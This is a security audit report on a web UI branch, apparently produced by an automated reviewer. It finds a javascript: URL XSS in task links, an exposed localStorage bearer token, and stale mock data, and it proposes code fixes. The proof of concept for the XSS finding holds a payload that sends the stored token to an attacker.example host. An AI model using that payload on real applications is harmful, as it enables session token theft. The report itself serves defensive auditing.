## Security Audit Report

### Summary
- Verdict: REQUEST CHANGES
- Critical: 0
- High: 1
- Medium: 1
- Low: 1
- Scope: Farm Table Phase 2 web UI implementation on `task-state-web-ui` at `2f912bbee2f4cfc2f40f2650164a56c69a697fb9`.
- Base note: the requested base commit `7a0f220dbd9332cb8db62138c841777432b4eda4` was not present locally, and `git fetch origin 7a0f220dbd9332cb8db62138c841777432b4eda4` failed due unauthenticated GitHub access. The local checkout contains the feature commit as a root commit, so I audited the scoped files directly and used `git show HEAD`/current source inspection rather than an exact base diff.

### Findings

#### [HIGH] Untrusted task external URLs are rendered directly as clickable links
- **Location:** `/workspace/web/src/components/inspector/ft-inspector-meta.ts:607`
- **Description:** `task.remoteUrl` is inserted directly into an anchor `href` and opened with `target="_blank"`. Lit escapes HTML text and attributes, but it does not validate URL schemes. If a task can carry a `javascript:` URL through import, generated client data, or a platform sync bug, a user clicking "Open External Source" can execute script in the Farm Table web UI context.
- **Impact:** An attacker who can influence task metadata could run script in the app origin after a click. That script can read non-httpOnly client state, including the current `farmtable.token` localStorage fallback when present, and issue authenticated app-origin requests.
- **Proof of concept:** Store or import a task with `remoteUrl` set to `javascript:fetch('https://attacker.example/log?t='+encodeURIComponent(localStorage.getItem('farmtable.token')||''))`, open that task in the inspector, then click "Open External Source".
- **Recommendation:** Validate and normalize outbound task URLs before rendering. Only allow `https:` and, if needed for local/dev integrations, narrowly allow `http:` on localhost. Render no link for invalid or unsupported values.

```ts
function safeExternalUrl(raw: string | undefined): string | null {
  if (!raw) return null;
  try {
    const url = new URL(raw);
    const localhost = url.hostname === 'localhost' || url.hostname === '127.0.0.1';
    if (url.protocol === 'https:' || (url.protocol === 'http:' && localhost)) {
      return url.href;
    }
  } catch {
    return null;
  }
  return null;
}

const externalUrl = safeExternalUrl(t.remoteUrl);
return externalUrl
  ? html`<a href=${externalUrl} target="_blank" rel="noopener noreferrer">...</a>`
  : nothing;
```

#### [MEDIUM] Bearer token fallback remains readable from localStorage
- **Location:** `/workspace/web/src/gen/grpc-client.ts:418`, `/workspace/web/src/components/ft-app.ts:313`
- **Description:** The generated client removed `?token=` handling, which is good, but still resolves `farmtable.token` from `localStorage` and `ft-app` skips the session check when that key exists. Any XSS in the UI or dependency code can read and exfiltrate this bearer token.
- **Impact:** A single client-side script execution bug can become credential theft. This compounds the `remoteUrl` finding above for users who rely on the dev/testing token fallback.
- **Recommendation:** Prefer the session-cookie path exclusively for normal web UI use. Gate localStorage token support behind an explicit development build flag or remove it from production builds.

```ts
const isDevTokenFallbackEnabled =
  import.meta.env.DEV && import.meta.env.VITE_ENABLE_LOCAL_TOKEN === 'true';

const token =
  globalConfig.FARMTABLE_TOKEN ??
  (isDevTokenFallbackEnabled ? localStorage.getItem('farmtable.token') : '') ??
  '';
```

Also avoid skipping session validation solely because `farmtable.token` exists unless the same development flag is enabled.

#### [LOW] Generated mock change history still exposes removed state vocabulary
- **Location:** `/workspace/web/src/gen/service.ts:400`, `/workspace/web/src/gen/service.ts:424`
- **Description:** The generated/mock service data still includes `oldValue: 'Ready'` and `newValue: 'Blocked'` for stage changes. This is not a direct vulnerability, but it violates the new task-state vocabulary contract and can leak removed terms into UI surfaces that display change history.
- **Impact:** Users may see stale state language despite the Phase 2 contract migration. This can also mask regressions in tests or screenshots that rely on mock data.
- **Recommendation:** Update mock change values to current stage/hold terminology, for example `Accepted` instead of `Ready`, and represent blocked state through hold/availability fields rather than a stage string.

```ts
{
  field: 'stage',
  oldValue: 'Accepted',
  newValue: 'Working',
}
```

### Positive Observations
- Task names, labels, assignee names, stage labels, filter labels, and aria text are rendered with Lit template interpolation, so plain task data is HTML-escaped by default.
- Comment Markdown uses `marked` followed by `DOMPurify.sanitize()` before `unsafeHTML`, which is the correct pattern for this codebase.
- URL token query parameter handling was removed from the generated gRPC client, reducing leakage through browser history, logs, and referrers.
- Collection-level GitHub links validate `remoteId` with a restrictive `owner/repo` regex before constructing `https://github.com/...`.
- The requested dependency audit reported zero vulnerabilities.

### Verification
- `npm audit --audit-level=low` in `/workspace/web`: passed, `found 0 vulnerabilities`.
- `npm test` in `/workspace/web`: passed.
- `npm run build` in `/workspace/web`: passed; Vite emitted a non-security chunk size warning for an 835.33 kB JS bundle and copied Shoelace assets.
- `git diff --check`: passed.

### Recommendations
- Add a focused test for external URL sanitization once implemented, covering `javascript:`, `data:`, malformed URLs, valid `https:`, and any intentionally allowed localhost `http:`.
- Consider disabling production source maps in `web/vite.config.ts` unless the deployment serves them behind access controls; source maps are useful operationally but expose full client source to anyone who can fetch `dist`.
